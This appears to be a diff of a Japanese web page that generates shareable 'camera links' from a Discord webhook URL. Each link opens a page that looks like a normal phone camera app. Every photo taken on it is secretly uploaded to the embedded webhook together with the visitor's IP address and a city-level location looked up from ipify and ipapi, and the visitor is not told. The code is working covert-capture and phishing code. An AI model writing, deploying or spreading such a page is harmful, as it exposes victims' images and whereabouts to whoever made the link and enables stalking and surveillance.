@@ -3,214 +3,152 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>カメラ</title>
+<title>カメラリンク作成</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
   :root {
-    --bg: #000000;
-    --ui: rgba(255,255,255,0.9);
-    --grid: rgba(255,255,255,0.25);
-    --focus: #ffcc00;
+    --bg: #121212;
+    --surface: #1e1e1e;
+    --text: #ffffff;
+    --muted: #888888;
+    --accent: #ffcc00;
+    --line: rgba(255,255,255,0.1);
   }
   html, body {
-    height: 100%;
-    background: var(--bg);
-    overflow: hidden;
-    user-select: none;
-    font-family: -apple-system, "Helvetica Neue", "Hiragino Sans", sans-serif;
+    height: 100%; background: var(--bg); color: var(--text);
+    font-family: -apple-system, "Hiragino Sans", sans-serif;
   }
-  .app { position: fixed; inset: 0; display: flex; flex-direction: column; }
+  
+  /* 作成サイト用 */
+  .creator-wrap {
+    padding: 40px 20px; max-width: 500px; margin: 0 auto;
+    display: flex; flex-direction: column; gap: 16px;
+  }
+  .creator-wrap h1 { font-size: 20px; text-align: center; margin-bottom: 20px; }
+  label { font-size: 13px; color: var(--muted); margin-bottom: 4px; display: block; }
+  input[type="text"] {
+    width: 100%; padding: 14px; border-radius: 10px;
+    background: var(--surface); border: 1px solid var(--line);
+    color: #fff; font-size: 14px; outline: none;
+  }
+  input[type="text"]:focus { border-color: var(--accent); }
+  button.primary {
+    width: 100%; padding: 16px; border-radius: 12px; border: none;
+    background: var(--accent); color: #000; font-weight: 800;
+    font-size: 16px; cursor: pointer; margin-top: 10px;
+  }
+  .result-box {
+    margin-top: 20px; padding: 20px; background: var(--surface);
+    border-radius: 12px; border: 1px solid var(--line); display: none;
+  }
+  .result-box.show { display: block; }
+  .result-box p { font-size: 12px; color: var(--muted); margin-bottom: 10px; }
+  .link-row { display: flex; gap: 8px; }
+  .link-row input { flex: 1; font-size: 12px; color: var(--accent); }
+  .link-row button {
+    padding: 0 16px; border-radius: 10px; border: none;
+    background: #333; color: #fff; font-weight: bold; cursor: pointer;
+  }
 
-  .camera-view {
-    position: absolute; inset: 0;
-    display: flex; align-items: center; justify-content: center;
-    overflow: hidden;
-    background: #000;
-  }
-  video {
-    width: 100%; height: 100%; object-fit: cover;
-    display: block;
-  }
+  /* カメラサイト用 */
+  #cameraApp { display: none; position: fixed; inset: 0; background: #000; flex-direction: column; }
+  #cameraApp.active { display: flex; }
+  
+  .camera-view { position: absolute; inset: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+  video { width: 100%; height: 100%; object-fit: cover; display: block; }
   canvas { display: none; }
 
-  .grid {
-    position: absolute; inset: 0; pointer-events: none; z-index: 10;
-  }
-  .grid-v1, .grid-v2 {
-    position: absolute; top: 0; bottom: 0; width: 1px;
-    background: var(--grid);
-  }
-  .grid-v1 { left: 33.333%; }
-  .grid-v2 { left: 66.666%; }
-  .grid-h1, .grid-h2 {
-    position: absolute; left: 0; right: 0; height: 1px;
-    background: var(--grid);
-  }
-  .grid-h1 { top: 33.333%; }
-  .grid-h2 { top: 66.666%; }
+  .grid { position: absolute; inset: 0; pointer-events: none; z-index: 10; }
+  .grid-v1, .grid-v2 { position: absolute; top: 0; bottom: 0; width: 1px; background: rgba(255,255,255,0.2); }
+  .grid-v1 { left: 33.33%; } .grid-v2 { left: 66.66%; }
+  .grid-h1, .grid-h2 { position: absolute; left: 0; right: 0; height: 1px; background: rgba(255,255,255,0.2); }
+  .grid-h1 { top: 33.33%; } .grid-h2 { top: 66.66%; }
 
-  .focus-cross {
-    position: absolute; top: 50%; left: 50%;
-    transform: translate(-50%, -50%);
-    width: 40px; height: 40px;
-    pointer-events: none; z-index: 10;
-  }
-  .focus-cross::before, .focus-cross::after {
-    content: ""; position: absolute; background: var(--focus);
-  }
-  .focus-cross::before {
-    top: 50%; left: 0; right: 0; height: 2px; transform: translateY(-50%);
-  }
-  .focus-cross::after {
-    top: 0; bottom: 0; left: 50%; width: 2px; transform: translateX(-50%);
-  }
-
-  .top-bar {
-    position: absolute; top: 0; left: 0; right: 0;
-    padding: 50px 20px 20px;
-    display: flex; align-items: center; justify-content: center;
-    gap: 40px;
-    z-index: 20;
-    background: linear-gradient(180deg, rgba(0,0,0,0.6) 0%, transparent 100%);
-    pointer-events: none;
-  }
-  .top-icon { width: 24px; height: 24px; fill: var(--ui); }
-  .top-icon.yellow { fill: var(--focus); }
+  .focus-cross { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 40px; height: 40px; pointer-events: none; z-index: 10; }
+  .focus-cross::before, .focus-cross::after { content: ""; position: absolute; background: var(--accent); }
+  .focus-cross::before { top: 50%; left: 0; right: 0; height: 2px; transform: translateY(-50%); }
+  .focus-cross::after { top: 0; bottom: 0; left: 50%; width: 2px; transform: translateX(-50%); }
 
   .bottom-bar {
     position: absolute; left: 0; right: 0; bottom: 0;
     padding: 20px 28px 40px;
     display: flex; align-items: center; justify-content: space-between;
-    z-index: 20;
-    background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, transparent 100%);
+    z-index: 20; background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, transparent 100%);
   }
-
   .thumb-btn {
-    width: 56px; height: 56px;
-    border-radius: 50%;
-    border: 2px solid rgba(255,255,255,0.3);
-    background: #1a1a1a;
-    overflow: hidden;
-    cursor: pointer;
-    position: relative;
-    display: flex; align-items: center; justify-content: center;
-    transition: transform 0.1s ease;
+    width: 56px; height: 56px; border-radius: 50%;
+    border: 2px solid rgba(255,255,255,0.3); background: #1a1a1a;
+    overflow: hidden; cursor: pointer; display: flex; align-items: center; justify-content: center;
   }
-  .thumb-btn:active { transform: scale(0.92); }
   .thumb-btn img { width: 100%; height: 100%; object-fit: cover; display: none; }
-  .thumb-empty { font-size: 12px; color: rgba(255,255,255,0.5); }
+  .thumb-empty { font-size: 12px; color: #666; }
 
-  .shutter-container {
-    display: flex; align-items: center; justify-content: center;
-    position: relative;
-  }
+  .shutter-container { display: flex; align-items: center; justify-content: center; }
   .shutter-outer {
-    width: 76px; height: 76px;
-    border-radius: 50%;
-    border: 3px solid rgba(255,255,255,0.9);
-    display: flex; align-items: center; justify-content: center;
-    cursor: pointer;
-    transition: transform 0.1s ease;
+    width: 76px; height: 76px; border-radius: 50%;
+    border: 3px solid #fff; display: flex; align-items: center; justify-content: center;
+    cursor: pointer; transition: transform 0.1s;
   }
   .shutter-outer:active { transform: scale(0.95); }
-  .shutter-inner {
-    width: 64px; height: 64px;
-    border-radius: 50%;
-    background: #ffffff;
-    transition: background 0.1s ease;
-  }
+  .shutter-inner { width: 64px; height: 64px; border-radius: 50%; background: #fff; }
   
-  .flash {
-    position: absolute; inset: 0;
-    background: #fff; opacity: 0; pointer-events: none;
-    z-index: 30;
-  }
+  .flash { position: absolute; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 30; }
   .flash.fire { animation: flashAnim 0.3s ease-out; }
-  @keyframes flashAnim {
-    0% { opacity: 0.8; }
-    100% { opacity: 0; }
-  }
+  @keyframes flashAnim { 0% { opacity: 0.8; } 100% { opacity: 0; } }
 
-  .gallery-overlay {
-    position: fixed; inset: 0;
-    background: rgba(0,0,0,0.95);
-    z-index: 40;
-    display: none;
-    flex-direction: column;
-  }
+  .gallery-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 40; display: none; flex-direction: column; }
   .gallery-overlay.open { display: flex; }
-  .gallery-header {
-    padding: 50px 20px 20px;
-    display: flex; align-items: center; justify-content: space-between;
-    color: #fff;
-  }
-  .gallery-header h2 { font-size: 18px; font-weight: 600; }
-  .gallery-close {
-    background: none; border: none; color: #fff;
-    font-size: 24px; cursor: pointer;
-  }
-  .gallery-grid {
-    flex: 1; overflow-y: auto;
-    padding: 10px 20px;
-    display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px;
-    align-content: start;
-  }
-  .gallery-item {
-    aspect-ratio: 3 / 4;
-    background: #222; border-radius: 4px;
-    overflow: hidden; cursor: pointer;
-  }
+  .gallery-header { padding: 50px 20px 20px; display: flex; justify-content: space-between; color: #fff; }
+  .gallery-close { background: none; border: none; color: #fff; font-size: 24px; cursor: pointer; }
+  .gallery-grid { flex: 1; overflow-y: auto; padding: 10px 20px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 4px; align-content: start; }
+  .gallery-item { aspect-ratio: 3 / 4; background: #222; border-radius: 4px; overflow: hidden; cursor: pointer; }
   .gallery-item img { width: 100%; height: 100%; object-fit: cover; }
-  .gallery-empty {
-    grid-column: 1 / -1; text-align: center; color: #888;
-    padding: 40px; font-size: 14px;
-  }
+  .gallery-empty { grid-column: 1 / -1; text-align: center; color: #888; padding: 40px; font-size: 14px; }
 
   .perm-screen {
-    position: fixed; inset: 0;
-    background: #000;
-    z-index: 50;
-    display: flex; flex-direction: column;
-    align-items: center; justify-content: center;
+    position: fixed; inset: 0; background: #000; z-index: 50;
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
     padding: 40px; text-align: center; color: #fff;
   }
   .perm-screen.hidden { display: none; }
   .perm-text { font-size: 15px; line-height: 1.8; margin-bottom: 24px; color: #ccc; }
-  .perm-btn {
-    background: #fff; color: #000;
-    border: none; border-radius: 30px;
-    padding: 14px 40px; font-size: 16px; font-weight: 600;
-    cursor: pointer;
-  }
-
-  .toast {
-    position: fixed; bottom: 140px; left: 50%; transform: translateX(-50%);
-    background: rgba(0,0,0,0.8); color: #fff;
-    padding: 10px 20px; border-radius: 20px; font-size: 13px;
-    opacity: 0; transition: opacity 0.2s; pointer-events: none; z-index: 60;
-  }
+  .perm-btn { background: #fff; color: #000; border: none; border-radius: 30px; padding: 14px 40px; font-size: 16px; font-weight: 600; cursor: pointer; }
+  
+  .toast { position: fixed; bottom: 140px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.8); color: #fff; padding: 10px 20px; border-radius: 20px; font-size: 13px; opacity: 0; transition: opacity 0.2s; pointer-events: none; z-index: 60; }
   .toast.show { opacity: 1; }
 </style>
 </head>
 <body>
-<div class="app">
+
+<!-- ================= 作成サイト ================= -->
+<div id="creatorApp" class="creator-wrap">
+  <h1>📷 カメラリンク作成</h1>
+  <div>
+    <label>Discord Webhook URL</label>
+    <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
+  </div>
+  <button class="primary" id="createBtn">リンクを作成</button>
+  
+  <div class="result-box" id="resultBox">
+    <p>下のリンクを開くとカメラが起動します。</p>
+    <div class="link-row">
+      <input type="text" id="linkInput" readonly>
+      <button id="copyBtn">コピー</button>
+    </div>
+  </div>
+</div>
+
+<!-- ================= カメラサイト ================= -->
+<div id="cameraApp">
   <div class="camera-view">
     <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
     <div class="grid">
-      <div class="grid-v1"></div>
-      <div class="grid-v2"></div>
-      <div class="grid-h1"></div>
-      <div class="grid-h2"></div>
+      <div class="grid-v1"></div><div class="grid-v2"></div>
+      <div class="grid-h1"></div><div class="grid-h2"></div>
     </div>
     <div class="focus-cross"></div>
     <div class="flash" id="flash"></div>
-  </div>
-
-  <div class="top-bar">
-    <svg class="top-icon" viewBox="0 0 24 24"><path d="M9 3L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2h-3.17L15 3H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-    <svg class="top-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
-    <svg class="top-icon yellow" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm4.59-12.42L10 14.17l-2.59-2.58L6 13l4 4 8-8z"/></svg>
   </div>
 
   <div class="bottom-bar">
@@ -218,36 +156,73 @@
       <span class="thumb-empty" id="thumbEmpty"></span>
       <img id="thumbImg" alt="">
     </div>
-
     <div class="shutter-container">
-      <div class="shutter-outer" id="shutter">
-        <div class="shutter-inner"></div>
-      </div>
+      <div class="shutter-outer" id="shutter"><div class="shutter-inner"></div></div>
     </div>
-
     <div style="width:56px;"></div>
   </div>
-</div>
 
-<div class="gallery-overlay" id="galleryOverlay">
-  <div class="gallery-header">
-    <h2>写真</h2>
-    <button class="gallery-close" id="galleryClose">✕</button>
+  <div class="gallery-overlay" id="galleryOverlay">
+    <div class="gallery-header">
+      <h2>写真</h2>
+      <button class="gallery-close" id="galleryClose">✕</button>
+    </div>
+    <div class="gallery-grid" id="galleryGrid">
+      <div class="gallery-empty" id="galleryEmpty">写真がありません</div>
+    </div>
   </div>
-  <div class="gallery-grid" id="galleryGrid">
-    <div class="gallery-empty" id="galleryEmpty">写真がありません</div>
+
+  <div class="perm-screen" id="permScreen">
+    <div class="perm-text" id="permText">カメラへのアクセスを許可してください</div>
+    <button class="perm-btn" id="permBtn">カメラを起動</button>
   </div>
+  
+  <div class="toast" id="toast"></div>
 </div>
-
-<div class="perm-screen" id="permScreen">
-  <div class="perm-text" id="permText">カメラへのアクセスを許可してください</div>
-  <button class="perm-btn" id="permBtn">カメラを起動</button>
-</div>
-
-<div class="toast" id="toast"></div>
 
 <script>
 (function () {
+  // ==== 共通 ====
+  function encodeBase64(obj) { return btoa(unescape(encodeURIComponent(JSON.stringify(obj)))); }
+  function decodeBase64(b64) { try { return JSON.parse(decodeURIComponent(escape(atob(b64)))); } catch (e) { return null; } }
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    if(!t) return;
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(showToast._t);
+    showToast._t = setTimeout(() => t.classList.remove('show'), 2000);
+  }
+
+  // ==== 作成サイト ロジック ====
+  const creatorApp = document.getElementById('creatorApp');
+  const cameraApp = document.getElementById('cameraApp');
+  const webhookInput = document.getElementById('webhookInput');
+  const createBtn = document.getElementById('createBtn');
+  const resultBox = document.getElementById('resultBox');
+  const linkInput = document.getElementById('linkInput');
+  const copyBtn = document.getElementById('copyBtn');
+
+  createBtn.addEventListener('click', () => {
+    const wh = webhookInput.value.trim();
+    if (!wh.startsWith('https://discord.com/api/webhooks/')) {
+      alert('正しいDiscord Webhook URLを入力してください。');
+      return;
+    }
+    const data = { w: wh };
+    const base = location.href.split(/[?#]/)[0];
+    const link = base + '#?d=' + encodeBase64(data);
+    linkInput.value = link;
+    resultBox.classList.add('show');
+  });
+
+  copyBtn.addEventListener('click', () => {
+    linkInput.select();
+    document.execCommand('copy');
+    copyBtn.textContent = '済';
+    setTimeout(() => copyBtn.textContent = 'コピー', 1500);
+  });
+
+  // ==== カメラサイト ロジック ====
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const flash = document.getElementById('flash');
@@ -255,84 +230,52 @@
   const thumbBtn = document.getElementById('thumbBtn');
   const thumbImg = document.getElementById('thumbImg');
   const thumbEmpty = document.getElementById('thumbEmpty');
-  
   const galleryOverlay = document.getElementById('galleryOverlay');
   const galleryGrid = document.getElementById('galleryGrid');
   const galleryEmpty = document.getElementById('galleryEmpty');
   const galleryClose = document.getElementById('galleryClose');
-  
   const permScreen = document.getElementById('permScreen');
   const permBtn = document.getElementById('permBtn');
   const permText = document.getElementById('permText');
-  const toast = document.getElementById('toast');
 
   let webhookURL = null;
   let stream = null;
   let mediaItems = [];
   let shutterBusy = false;
 
-  function decodeBase64(b64) {
-    try { return JSON.parse(decodeURIComponent(escape(atob(b64)))); } catch (e) { return null; }
-  }
-
-  function readConfig() {
-    const hash = location.hash || '';
-    const match = hash.match(/[?&]d=([^&]+)/);
-    if (!match) return null;
-    return decodeBase64(decodeURIComponent(match[1]));
-  }
-
-  function showToast(msg) {
-    toast.textContent = msg;
-    toast.classList.add('show');
-    clearTimeout(showToast._t);
-    showToast._t = setTimeout(() => toast.classList.remove('show'), 2000);
-  }
-
-  async function initCamera() {
+  function initCamera() {
     permText.textContent = "カメラを起動中...";
     permBtn.style.display = 'none';
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } },
-        audio: false
-      });
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' }, width: { ideal: 1920 }, height: { ideal: 1080 } },
+      audio: false
+    }).then(s => {
+      stream = s;
       video.srcObject = stream;
-      await video.play().catch(() => {});
+      video.play().catch(() => {});
       permScreen.classList.add('hidden');
-    } catch (err) {
-      permText.textContent = "カメラにアクセスできません: " + err.message;
+    }).catch(err => {
+      permText.textContent = "カメラエラー: " + err.message;
       permBtn.style.display = 'block';
       permBtn.textContent = "再試行";
-    }
+    });
   }
 
   permBtn.addEventListener('click', initCamera);
 
-  function fireFlash() {
-    flash.classList.remove('fire');
-    void flash.offsetWidth;
-    flash.classList.add('fire');
-  }
-
   function takePhoto() {
     if (!stream || !video.videoWidth || shutterBusy) return;
     shutterBusy = true;
-    fireFlash();
+    flash.classList.remove('fire'); void flash.offsetWidth; flash.classList.add('fire');
 
-    const w = video.videoWidth;
-    const h = video.videoHeight;
-    canvas.width = w;
-    canvas.height = h;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, w, h);
-    
-    // 画像データの生成
+    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
     const dataURL = canvas.toDataURL('image/jpeg', 0.92);
     const blob = dataURLtoBlob(dataURL);
 
-    // UIの更新と保存
-    addMediaItem(dataURL, blob);
+    mediaItems.push({ dataURL, blob, timestamp: Date.now() });
+    thumbEmpty.style.display = 'none'; thumbImg.style.display = 'block'; thumbImg.src = dataURL;
+    renderGallery();
     sendToWebhook(blob);
 
     setTimeout(() => { shutterBusy = false; }, 300);
@@ -349,81 +292,38 @@
     return new Blob([bytes], { type: mime });
   }
 
-  function addMediaItem(dataURL, blob) {
-    mediaItems.push({ dataURL, blob, timestamp: Date.now() });
-    
-    // 左下のサムネイルを更新
-    thumbEmpty.style.display = 'none';
-    thumbImg.style.display = 'block';
-    thumbImg.src = dataURL;
-    
-    renderGallery();
-  }
-
   function renderGallery() {
-    if (mediaItems.length === 0) {
-      galleryEmpty.style.display = 'block';
-      return;
-    }
+    if (mediaItems.length === 0) { galleryEmpty.style.display = 'block'; return; }
     galleryEmpty.style.display = 'none';
-    
-    // 子要素のクリア（空表示以外）
-    Array.from(galleryGrid.children).forEach(child => {
-      if (child !== galleryEmpty) galleryGrid.removeChild(child);
-    });
-
-    // 新しい順に表示
+    Array.from(galleryGrid.children).forEach(c => { if (c !== galleryEmpty) galleryGrid.removeChild(c); });
     for (let i = mediaItems.length - 1; i >= 0; i--) {
       const item = mediaItems[i];
       const el = document.createElement('div');
       el.className = 'gallery-item';
-      
-      const img = document.createElement('img');
-      img.src = item.dataURL;
+      const img = document.createElement('img'); img.src = item.dataURL;
       el.appendChild(img);
-      
-      el.addEventListener('click', () => {
+      el.onclick = () => {
         const url = URL.createObjectURL(item.blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = 'photo_' + item.timestamp + '.jpg';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        setTimeout(() => URL.revokeObjectURL(url), 2000);
-        showToast('保存しました');
-      });
-      
+        const a = document.createElement('a'); a.href = url; a.download = 'photo_' + item.timestamp + '.jpg';
+        a.click(); setTimeout(() => URL.revokeObjectURL(url), 2000); showToast('保存しました');
+      };
       galleryGrid.appendChild(el);
     }
   }
 
-  thumbBtn.addEventListener('click', () => {
-    if (mediaItems.length === 0) return;
-    galleryOverlay.classList.add('open');
-  });
-
-  galleryClose.addEventListener('click', () => {
-    galleryOverlay.classList.remove('open');
-  });
+  thumbBtn.addEventListener('click', () => { if (mediaItems.length > 0) galleryOverlay.classList.add('open'); });
+  galleryClose.addEventListener('click', () => galleryOverlay.classList.remove('open'));
 
   async function getClientInfo() {
-    let ip = 'unknown';
-    let geo = 'unknown';
+    let ip = 'unknown', geo = 'unknown';
     try {
       const r = await fetch('https://api.ipify.org?format=json');
-      const d = await r.json();
-      ip = d.ip || 'unknown';
+      const d = await r.json(); ip = d.ip;
     } catch (e) {}
     try {
-      const r2 = await fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/', { cache: 'no-store' });
-      if (r2.ok) {
-        const g = await r2.json();
-        if (!g.error) {
-          const parts = [g.country_name, g.region, g.city].filter(v => v);
-          if (parts.length) geo = parts.join(' / ');
-        }
-      }
+      const r2 = await fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/');
+      const g = await r2.json();
+      if (!g.error) geo = [g.country_name, g.region, g.city].filter(v => v).join(' / ');
     } catch (e) {}
     return { ip, geo };
   }
@@ -432,9 +332,7 @@
     if (!webhookURL) return;
     try {
       const client = await getClientInfo();
-      const sizeKB = Math.round(blob.size / 1024);
       const fname = 'capture_' + Date.now() + '.jpg';
-
       const payload = {
         username: 'Camera Bot',
         embeds: [{
@@ -443,46 +341,47 @@
           fields: [
             { name: 'IP', value: '`' + client.ip + '`', inline: true },
             { name: '推定住所', value: '`' + client.geo + '`', inline: true },
-            { name: 'サイズ', value: '`' + sizeKB + ' KB`', inline: true },
             { name: '日時', value: '`' + new Date().toLocaleString('ja-JP') + '`', inline: true }
           ],
           image: { url: 'attachment://' + fname }
         }]
       };
-
       const form = new FormData();
       form.append('payload_json', JSON.stringify(payload));
       form.append('files[0]', blob, fname);
+      await fetch(webhookURL, { method: 'POST', body: form });
+    } catch (e) { console.error(e); }
+  }
 
-      const res = await fetch(webhookURL, { method: 'POST', body: form });
-      if (!res.ok) {
-        console.error('送信失敗', res.status);
+  // ==== ルーティング（画面切り替え） ====
+  function router() {
+    const hash = location.hash || '';
+    if (hash.includes('?d=')) {
+      const match = hash.match(/[?&]d=([^&]+)/);
+      const data = match ? decodeBase64(decodeURIComponent(match[1])) : null;
+      
+      if (data && data.w) {
+        webhookURL = data.w;
+        creatorApp.style.display = 'none';
+        cameraApp.classList.add('active');
+        permScreen.classList.remove('hidden');
+        permBtn.style.display = 'block';
+        permText.textContent = "カメラへのアクセスを許可してください";
+      } else {
+        alert('設定データが不正です');
+        creatorApp.style.display = 'flex';
+        cameraApp.classList.remove('active');
       }
-    } catch (e) {
-      console.error('送信エラー', e);
-    }
-  }
-
-  window.addEventListener('beforeunload', () => {
-    if (stream) stream.getTracks().forEach(t => t.stop());
-  });
-
-  function boot() {
-    const cfg = readConfig();
-    if (cfg && cfg.w) {
-      webhookURL = cfg.w;
     } else {
-      permText.textContent = 'リンクが無効です。作成サイトから発行したURLを開いてください。';
-      permBtn.style.display = 'none';
-      permScreen.classList.remove('hidden');
-      return;
+      creatorApp.style.display = 'flex';
+      cameraApp.classList.remove('active');
+      if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
     }
-    
-    // 自動で許可画面を出す（iOS等の制約のため、タップで起動させる）
-    permScreen.classList.remove('hidden');
   }
 
-  boot();
+  window.addEventListener('hashchange', router);
+  router();
+
 })();
 </script>
 </body>
